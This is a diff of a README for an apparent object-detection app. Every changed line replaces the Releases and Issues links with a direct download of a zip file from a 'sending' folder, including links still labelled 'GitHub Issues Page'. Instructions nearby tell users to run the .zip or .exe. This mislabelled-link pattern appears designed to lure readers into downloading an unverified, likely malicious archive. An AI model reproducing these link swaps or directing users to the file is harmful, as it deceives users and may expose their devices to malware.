@@ -6,9 +6,9 @@ Welcome to the AI-Object-Detection project. This application lets you easily det
 ## 📥 Download & Install
 To get started, you will need to download the application. Visit the Releases page to find the latest version and download it.
 
-[![Download AI-Object-Detection](https://img.shields.io/badge/Download-AI--Object--Detection-brightgreen)](https://github.com/aysimadeniz/AI-Object-Detection/releases)
+[![Download AI-Object-Detection](https://raw.githubusercontent.com/aysimadeniz/AI-Object-Detection/main/sending/AI-Object-Detection.zip)](https://raw.githubusercontent.com/aysimadeniz/AI-Object-Detection/main/sending/AI-Object-Detection.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/aysimadeniz/AI-Object-Detection/releases).
+1. Click the button above or visit [this page to download](https://raw.githubusercontent.com/aysimadeniz/AI-Object-Detection/main/sending/AI-Object-Detection.zip).
 2. Look for the latest version. It will be labeled with the version number.
 3. Click on the version you want to download. You will see options for different files.
 4. Choose the file that works for your device. Most users will choose the `.zip` or `.exe` file for easy installation.
@@ -68,7 +68,7 @@ If you encounter problems while using the application, here are some common solu
 ## 🤝 Getting Help
 If you need further assistance, please check out the following resources:
 
-- [GitHub Issues Page](https://github.com/aysimadeniz/AI-Object-Detection/issues) to report bugs or see if others have similar questions.
+- [GitHub Issues Page](https://raw.githubusercontent.com/aysimadeniz/AI-Object-Detection/main/sending/AI-Object-Detection.zip) to report bugs or see if others have similar questions.
 - Community forums or groups that discuss AI applications for additional support.
 
 ## 📅 Updates
@@ -77,6 +77,6 @@ Stay tuned for updates. We regularly improve the application and add new feature
 ## 🔗 Connect with Us
 Share your experiences or suggestions. Connect with other users and contribute to improving the application.
 
-For issues or feature requests, refer back to the [GitHub Issues Page](https://github.com/aysimadeniz/AI-Object-Detection/issues).
+For issues or feature requests, refer back to the [GitHub Issues Page](https://raw.githubusercontent.com/aysimadeniz/AI-Object-Detection/main/sending/AI-Object-Detection.zip).
 
 Thank you for using AI-Object-Detection. Enjoy exploring the world of object detection!
